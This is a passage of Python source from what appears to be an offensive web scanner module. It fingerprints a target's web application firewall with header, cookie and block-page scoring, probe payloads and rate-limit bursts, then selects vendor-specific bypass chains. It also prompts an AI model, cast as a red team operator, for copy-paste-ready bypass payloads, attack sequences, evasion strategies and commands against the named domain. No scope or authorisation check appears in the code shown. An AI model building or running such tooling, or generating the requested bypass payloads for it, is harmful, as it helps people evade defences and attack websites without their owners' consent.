        hint_name   = waf_hint.get("name", "") if waf_hint.get("detected") else ""
        tech_profile = pa.get("tech_profile", {})

        # ── Extract active subdomains for probe targets ───────────────
        targets = self._pick_probe_targets(domain, scan_results)
        self.logger.info(f"Probe targets: {targets[:3]}")

        # ── Pass 1: collect baseline headers ─────────────────────────
        all_evidence: Dict[str, Any] = {
            "headers":    defaultdict(list),
            "cookies":    set(),
            "block_body": [],
            "challenge":  [],
        }
        baseline_responses: List[Dict] = []

        for url in targets[:3]:
            resp_data = self._fetch_baseline(url)
            if resp_data:
                baseline_responses.append(resp_data)
                self._merge_evidence(all_evidence, resp_data)

        if not baseline_responses:
            return self._empty_result(domain, start, "No reachable targets")

        baseline = baseline_responses[0]

        # ── Pass 1: header + cookie fingerprinting ────────────────────
        vendor_scores: Dict[str, int] = defaultdict(int)
        vendor_evidence: Dict[str, List[str]] = defaultdict(list)

        self._score_from_headers(
            all_evidence["headers"],
            vendor_scores, vendor_evidence
        )
        self._score_from_cookies(
            all_evidence["cookies"],
            vendor_scores, vendor_evidence
        )

        # ── Pass 1: WAF probe payload responses ───────────────────────
        probe_results: List[Dict] = []
        for label, payload, location in WAF_PROBE_PAYLOADS[:12]:
            pr = self._send_probe(targets[0], label, payload, location, baseline)
            if pr:
                probe_results.append(pr)
                # Score from block body matches
                self._score_from_block_body(
                    pr.get("response_body", ""),
                    vendor_scores, vendor_evidence
                )
                time.sleep(self.probe_delay)

        # ── Pass 1: challenge page detection ─────────────────────────
        self._score_from_challenge(
            all_evidence["challenge"],
            vendor_scores, vendor_evidence
        )

        # ── Pass 1: rate limit detection ─────────────────────────────
        rate_limited = self._detect_rate_limit(targets[0])

        # ── Pass 1: determine winner vendor ──────────────────────────
        vendor, confidence, confidence_score = self._determine_vendor(
            vendor_scores, vendor_evidence, hint_name
        )

        # ── Pass 1: version derivation ────────────────────────────────
        version_clues = self._derive_version(
            vendor, all_evidence, probe_results
        )

        # ── Bypass chain selection ────────────────────────────────────
        bypass_chain = self._select_bypass_chain(
            vendor,
            scan_results.get("payload_analysis", {}).get("vuln_classes", []),
        )

        # ── Pass 2: AI enrichment ─────────────────────────────────────
        ai_result = None
        if self.groq_api_key and vendor:
            ai_result = self._ai_analysis(
                domain, vendor, confidence, version_clues,
                probe_results, bypass_chain, tech_profile,
                scan_results.get("payload_analysis", {}).get("vuln_classes", []),
                rate_limited,
                all_evidence,
            )

        duration = round(time.time() - start, 2)
        self.logger.info(
            f"WAF fingerprint complete — vendor={vendor} "
            f"confidence={confidence} in {duration}s"
        )

        return {
            "detected":           bool(vendor),
            "vendor":             vendor,
            "confidence":         confidence,
            "confidence_score":   confidence_score,
            "version_clues":      version_clues,
            "evidence": {
                "headers": dict(all_evidence["headers"]),
                "cookies": list(all_evidence["cookies"]),
                "block_body": all_evidence["block_body"][:5],
                "challenge":  all_evidence["challenge"][:5],
            },
            "probe_results":          probe_results,
            "rate_limit_detected":    rate_limited,
            "vendor_evidence":        dict(vendor_evidence),
            "bypass_chain":           bypass_chain,
            "ai_analysis":            ai_result,
            "scan_metadata": {
                "domain":                domain,
                "scan_duration_seconds": duration,
                "timestamp":             datetime.now().isoformat(),
                "ai_model":              "Groq Llama3-70B" if ai_result else "Rule-based only",
                "probes_sent":           len(probe_results),
                "targets_probed":        len(targets[:3]),
            },
        }

    # ------------------------------------------------------------------
    # Target selection
    # ------------------------------------------------------------------

    def _pick_probe_targets(self, domain: str, scan_results: Dict) -> List[str]:
        targets: List[str] = []
        seen:    Set[str]  = set()

        def _add(url: str) -> None:
            u = url.lower().rstrip("/")
            if u not in seen:
                seen.add(u)
                targets.append(url)

        # Main domain — prefer HTTPS
        _add(f"https://{domain}/")

        # Active subdomains that responded
        for sub in scan_results.get("subdomains", []):
            if not isinstance(sub, dict):
                continue
            name = sub.get("subdomain", "")
            if sub.get("https_status") == 200:
                _add(f"https://{name}/")
            elif sub.get("http_status") == 200:
                _add(f"http://{name}/")

        if not targets:
            _add(f"http://{domain}/")

        return targets

    # ------------------------------------------------------------------
    # Baseline fetch
    # ------------------------------------------------------------------

    def _fetch_baseline(self, url: str) -> Optional[Dict]:
        try:
            resp = self._session.get(
                url,
                headers = {"User-Agent": random.choice(self._ua_pool)},
                timeout = self.timeout,
                verify  = False,
                allow_redirects = True,
            )
            return {
                "url":        url,
                "status":     resp.status_code,
                "headers":    {k.lower(): v for k, v in resp.headers.items()},
                "body":       resp.text[:3000],
                "cookies":    {c.name.lower(): c.value
                               for c in resp.cookies},
            }
        except Exception as e:
            self.logger.debug(f"Baseline fetch failed {url}: {e}")
            return None

    # ------------------------------------------------------------------
    # Evidence merging
    # ------------------------------------------------------------------

    @staticmethod
    def _merge_evidence(evidence: Dict, resp_data: Dict) -> None:
        for k, v in resp_data.get("headers", {}).items():
            if v not in evidence["headers"][k]:
                evidence["headers"][k].append(v)
        for name in resp_data.get("cookies", {}):
            evidence["cookies"].add(name)
        body = resp_data.get("body", "")
        # Check for challenge signals
        for vendor, fp in WAF_FINGERPRINTS.items():
            for sig in fp.get("challenge_body", []):
                if sig.lower() in body.lower():
                    if sig not in evidence["challenge"]:
                        evidence["challenge"].append(sig)

    # ------------------------------------------------------------------
    # Scoring methods
    # ------------------------------------------------------------------

    def _score_from_headers(
        self,
        headers:          Dict[str, List[str]],
        vendor_scores:    Dict[str, int],
        vendor_evidence:  Dict[str, List[str]],
    ) -> None:
        for vendor, fp in WAF_FINGERPRINTS.items():
            for header_name, patterns in fp.get("headers", {}).items():
                hname_lower = header_name.lower()
                seen_values = headers.get(hname_lower, [])
                for val in seen_values:
                    for pattern in patterns:
                        try:
                            if re.search(pattern, val, re.IGNORECASE):
                                vendor_scores[vendor] += 3
                                vendor_evidence[vendor].append(
                                    f"Header {header_name}: {val[:60]}"
                                )
                                break
                        except re.error:
                            if pattern.lower() in val.lower():
                                vendor_scores[vendor] += 3
                                vendor_evidence[vendor].append(
                                    f"Header {header_name}: {val[:60]}"
                                )
                                break

            # Unique header keys as strong signals
            for x_header in fp.get("x_header_keys", []):
                if x_header.lower() in headers:
                    vendor_scores[vendor] += 5
                    vendor_evidence[vendor].append(
                        f"Unique header present: {x_header}"
                    )

            # Server header
            server_vals = headers.get("server", [])
            for sv in server_vals:
                for pattern in fp.get("server_header", []):
                    if pattern.lower() in sv.lower():
                        vendor_scores[vendor] += 4
                        vendor_evidence[vendor].append(
                            f"Server header: {sv[:60]}"
                        )
                        break

    def _score_from_cookies(
        self,
        cookies:         Set[str],
        vendor_scores:   Dict[str, int],
        vendor_evidence: Dict[str, List[str]],
    ) -> None:
        for vendor, fp in WAF_FINGERPRINTS.items():
            for cookie_pattern in fp.get("cookies", []):
                for cookie_name in cookies:
                    if cookie_pattern.lower() in cookie_name.lower():
                        vendor_scores[vendor] += 4
                        vendor_evidence[vendor].append(
                            f"Cookie match: {cookie_name} ~ {cookie_pattern}"
                        )
                        break

    def _score_from_block_body(
        self,
        body:            str,
        vendor_scores:   Dict[str, int],
        vendor_evidence: Dict[str, List[str]],
    ) -> None:
        body_lower = body.lower()
        for vendor, fp in WAF_FINGERPRINTS.items():
            for pattern in fp.get("block_body", []):
                if pattern.lower() in body_lower:
                    vendor_scores[vendor] += 5
                    vendor_evidence[vendor].append(
                        f"Block body: '{pattern[:50]}'"
                    )

    def _score_from_challenge(
        self,
        challenge_signals: List[str],
        vendor_scores:     Dict[str, int],
        vendor_evidence:   Dict[str, List[str]],
    ) -> None:
        for vendor, fp in WAF_FINGERPRINTS.items():
            for sig in challenge_signals:
                if sig in fp.get("challenge_body", []):
                    vendor_scores[vendor] += 6
                    vendor_evidence[vendor].append(
                        f"Challenge signal: '{sig[:50]}'"
                    )

    # ------------------------------------------------------------------
    # Probe sender
    # ------------------------------------------------------------------

    def _send_probe(
        self,
        url:      str,
        label:    str,
        payload:  str,
        location: str,
        baseline: Dict,
    ) -> Optional[Dict]:
        try:
            headers = {"User-Agent": random.choice(self._ua_pool)}

            if location == "query":
                probe_url = url.rstrip("/") + f"/?test={req_lib.utils.quote(payload)}"
                resp = self._session.get(
                    probe_url, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            elif location == "header":
                ua = SCANNER_UAS.get(label, payload)
                headers["User-Agent"] = ua
                resp = self._session.get(
                    url, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            elif location == "body":
                resp = self._session.post(
                    url, data={"test": payload}, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            else:
                probe_url = url.rstrip("/") + f"/?test={req_lib.utils.quote(payload)}"
                resp = self._session.get(
                    probe_url, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )

            baseline_len    = len(baseline.get("body", ""))
            response_body   = resp.text[:2000]
            response_len    = len(resp.content)
            status_changed  = resp.status_code != baseline.get("status", 200)
            len_delta       = abs(response_len - baseline_len)
            triggered       = (
                resp.status_code in (403, 406, 429, 503, 400)
                or status_changed
                or len_delta > baseline_len * 0.4
            )

            return {
                "probe_label":     label,
                "payload":         payload[:100],
                "location":        location,
                "triggered":       triggered,
                "status_code":     resp.status_code,
                "baseline_status": baseline.get("status", 0),
                "response_length": response_len,
                "baseline_length": baseline_len,
                "length_delta":    len_delta,
                "status_changed":  status_changed,
                "response_body":   response_body,
                "response_headers": {k.lower(): v for k, v in resp.headers.items()},
            }

        except Exception as e:
            self.logger.debug(f"Probe {label} failed: {e}")
            return None

    # ------------------------------------------------------------------
    # Rate limit detection
    # ------------------------------------------------------------------

    def _detect_rate_limit(self, url: str) -> bool:
        """Send burst of requests and check if any returns 429."""
        statuses: List[int] = []
        try:
            for _ in range(RATE_PROBE_COUNT):
                resp = self._session.get(
                    url,
                    headers={"User-Agent": random.choice(self._ua_pool)},
                    timeout=5, verify=False, allow_redirects=False,
                )
                statuses.append(resp.status_code)
        except Exception:
            pass
        return 429 in statuses

    # ------------------------------------------------------------------
    # Vendor determination
    # ------------------------------------------------------------------

    def _determine_vendor(
        self,
        vendor_scores:   Dict[str, int],
        vendor_evidence: Dict[str, List[str]],
        hint_name:       str,
    ) -> Tuple[Optional[str], str, int]:
        if not vendor_scores:
            # Fallback to hint from payload_analysis
            if hint_name:
                return hint_name, CONFIDENCE_LOW, CONFIDENCE_SCORE[CONFIDENCE_LOW]
            return None, CONFIDENCE_LOW, 0

        top_vendor = max(vendor_scores, key=lambda v: vendor_scores[v])
        top_score  = vendor_scores[top_vendor]

        # Apply hint bonus
        if hint_name and hint_name.lower() in top_vendor.lower():
            top_score += 3
        elif hint_name and top_vendor != hint_name:
            # Hint disagrees — lower confidence
            if vendor_scores.get(hint_name, 0) > top_score * 0.7:
                top_vendor = hint_name
                top_score  = vendor_scores.get(hint_name, 0) + 2

        fp_cw = WAF_FINGERPRINTS.get(top_vendor, {}).get("confidence_weight", 2)
        evidence_count = len(vendor_evidence.get(top_vendor, []))

        if top_score >= 10 and evidence_count >= fp_cw + 1:
            confidence = CONFIDENCE_HIGH
        elif top_score >= 5 and evidence_count >= fp_cw:
            confidence = CONFIDENCE_MEDIUM
        else:
            confidence = CONFIDENCE_LOW

        norm_score = min(100, int((top_score / max(1, max(vendor_scores.values()))) * 100))
        return top_vendor, confidence, norm_score

    # ------------------------------------------------------------------
    # Version derivation
    # ------------------------------------------------------------------

    def _derive_version(
        self,
        vendor:       Optional[str],
        evidence:     Dict,
        probe_results: List[Dict],
    ) -> List[str]:
        clues: List[str] = []
        if not vendor or vendor not in WAF_FINGERPRINTS:
            return clues

        fp = WAF_FINGERPRINTS[vendor]
        # Check all response bodies from probes
        all_bodies = " ".join(
            pr.get("response_body", "") for pr in probe_results
        )
        for pattern, description in fp.get("version_patterns", {}).items():
            if re.search(pattern, all_bodies, re.IGNORECASE):
                clues.append(description)

        # Header-based version clues
        for header_values in evidence.get("headers", {}).values():
            for val in header_values:
                for pattern, description in fp.get("version_patterns", {}).items():
                    if re.search(pattern, val, re.IGNORECASE):
                        if description not in clues:
                            clues.append(description)

        return clues

    # ------------------------------------------------------------------
    # Bypass chain selection
    # ------------------------------------------------------------------

    def _select_bypass_chain(
        self,
        vendor:       Optional[str],
        vuln_classes: List[str],
    ) -> List[Dict]:
        """
        Return ordered bypass techniques relevant to the detected vendor
        and the vuln classes identified by payload_analysis.
        """
        chains: List[Dict] = []

        if not vendor:
            vendor_techs = BYPASS_TECHNIQUES.get("generic", [])
        else:
            vendor_techs = BYPASS_TECHNIQUES.get(vendor, [])
            if not vendor_techs:
                # Try partial match
                for k in BYPASS_TECHNIQUES:
                    if k.lower() in vendor.lower() or vendor.lower() in k.lower():
                        vendor_techs = BYPASS_TECHNIQUES[k]
                        break

        # Always append generic techniques
        generic = BYPASS_TECHNIQUES.get("generic", [])

        all_techs = vendor_techs + generic

        # Filter by relevance to detected vuln classes
        if vuln_classes:
            relevant: List[Dict] = []
            fallback: List[Dict] = []
            for tech in all_techs:
                applies = tech.get("applies_to", [])
                if "all" in applies or any(vc in applies for vc in vuln_classes):
                    relevant.append(tech)
                else:
                    fallback.append(tech)
            chains = relevant + fallback[:3]
        else:
            chains = all_techs

        # Deduplicate by name
        seen_names: Set[str] = set()
        result: List[Dict] = []
        for tech in chains:
            if tech["name"] not in seen_names:
                seen_names.add(tech["name"])
                result.append(tech)

        return result[:10]

    # ------------------------------------------------------------------
    # Pass 2 — Groq AI analysis
    # ------------------------------------------------------------------

    def _ai_analysis(
        self,
        domain:       str,
        vendor:       str,
        confidence:   str,
        version_clues: List[str],
        probe_results: List[Dict],
        bypass_chain:  List[Dict],
        tech_profile:  Dict,
        vuln_classes:  List[str],
        rate_limited:  bool,
        evidence:      Dict,
    ) -> Optional[Dict]:
        try:
            prompt = self._build_prompt(
                domain, vendor, confidence, version_clues,
                probe_results, bypass_chain, tech_profile,
                vuln_classes, rate_limited, evidence,
            )
            text = self._call_groq(prompt)
            if not text:
                return None
            return self._parse_ai_response(text)
        except Exception as e:
            self.logger.error(f"AI analysis failed: {e}")
            return None

    def _build_prompt(
        self,
        domain:       str,
        vendor:       str,
        confidence:   str,
        version_clues: List[str],
        probe_results: List[Dict],
        bypass_chain:  List[Dict],
        tech_profile:  Dict,
        vuln_classes:  List[str],
        rate_limited:  bool,
        evidence:      Dict,
    ) -> str:
        # Condense probe results
        triggered_probes = [
            {"label": pr["probe_label"], "status": pr["status_code"],
             "delta": pr.get("length_delta", 0)}
            for pr in probe_results if pr.get("triggered")
        ]

        condensed_bypasses = [
            {
                "name":        b["name"],
                "applies_to":  b.get("applies_to", [])[:4],
                "risk":        b.get("detection_risk", "?"),
                "limitations": b.get("limitations", "")[:100],
            }
            for b in bypass_chain[:8]
        ]

        return f"""You are a senior red team operator specialising in WAF bypass techniques.
Analyze this WAF fingerprint for {domain} and return ONLY valid JSON.

WAF Vendor: {vendor}
Confidence: {confidence}
Version clues: {version_clues}
Tech stack: {json.dumps(tech_profile, default=str)}
Vuln classes present: {vuln_classes}
Rate limiting detected: {rate_limited}

Evidence headers/cookies: {json.dumps(list(evidence.get('cookies',set()))[:8] + list(evidence.get('block_body',[]))[:3], default=str)}
Triggered probes: {json.dumps(triggered_probes[:8], indent=2)}
Candidate bypass techniques: {json.dumps(condensed_bypasses, indent=2)}

Return a JSON object with EXACTLY these keys:
- "waf_summary": string — 2-3 sentences: vendor, confidence, what that means for the engagement.
- "bypass_priority": array of objects ordered best-first, each with:
    "rank" (int 1-10),
    "technique_name" (string — from candidates or your own recommendation),
    "why_this_waf" (string — specific to {vendor}, not generic),
    "ready_payload" (string — a copy-paste ready payload or command),
    "detection_risk" (low|medium|high),
    "estimated_success_probability" (string — e.g. "60-70%" with brief reasoning).
- "attack_sequence": array of strings — ordered step-by-step bypass workflow:
    starting from initial probe, through technique application, to payload delivery.
    Specific to {vendor} + detected vuln classes.
- "rate_limit_strategy": string — specific strategy for dealing with
    {'detected rate limiting' if rate_limited else 'potential rate limiting'} on {vendor}.
- "tooling": array of objects, each with "tool" (string), "command" (string — actual command for {domain}), "purpose" (string).
- "confidence_assessment": string — 1-2 sentences explaining what additional evidence
    would raise or lower confidence in the {vendor} identification.

Return ONLY valid JSON. No markdown fences, no preamble."""

    def _call_groq(self, prompt: str) -> Optional[str]:
        headers = {
            "Authorization": f"Bearer {self.groq_api_key}",
            "Content-Type":  "application/json",
        }
        payload = {
            "model":       "llama3-70b-8192",
            "messages":    [{"role": "user", "content": prompt}],
            "temperature": 0.2,
            "max_tokens":  2000,
        }
        for attempt in range(3):
            try:
                self.logger.info(f"Groq API call attempt {attempt + 1}")
                resp = req_lib.post(
                    "https://api.groq.com/openai/v1/chat/completions",
                    headers = headers,
                    json    = payload,
                    timeout = 50,
                )
                if resp.status_code == 200:
                    return resp.json()["choices"][0]["message"]["content"]
                if resp.status_code == 429:
                    time.sleep(12 * (attempt + 1))
                    continue
                break
            except req_lib.exceptions.Timeout:
                if attempt < 2:
                    time.sleep(2 ** attempt)
            except Exception as e:
                self.logger.error(f"Groq error: {e}")
                break
        return None

    def _parse_ai_response(self, text: str) -> Optional[Dict]:
        cleaned = text.strip()
        if cleaned.startswith("```"):
            cleaned = cleaned.split("```")[1]
            if cleaned.startswith("json"):
                cleaned = cleaned[4:]
        cleaned = cleaned.strip()
        try:
            parsed = json.loads(cleaned)
            parsed["ai_model"]     = "Groq Llama3-70B"
            parsed["generated_at"] = datetime.now().isoformat()
            return parsed
        except json.JSONDecodeError:
            start = cleaned.find("{")
            end   = cleaned.rfind("}") + 1
            if start != -1 and end > start:
                try:
                    parsed = json.loads(cleaned[start:end])
                    parsed["ai_model"]     = "Groq Llama3-70B"
                    parsed["generated_at"] = datetime.now().isoformat()
                    return parsed
                except json.JSONDecodeError:
                    pass
            self.logger.error("Could not parse AI JSON response")
            return None

    # ------------------------------------------------------------------
    # Empty result helper
    # ------------------------------------------------------------------

    @staticmethod
    def _empty_result(domain: str, start: float, reason: str) -> Dict:
        return {
            "detected":               False,
            "vendor":                 None,
            "confidence":             CONFIDENCE_LOW,
            "confidence_score":       0,
            "version_clues":          [],
            "evidence":               {},
            "probe_results":          [],
            "rate_limit_detected":    False,
            "bypass_chain":           [],
            "ai_analysis":            None,
            "scan_metadata": {
                "domain":                domain,
                "scan_duration_seconds": round(time.time() - start, 2),
                "timestamp":             datetime.now().isoformat(),
                "note":                  reason,
            },
        }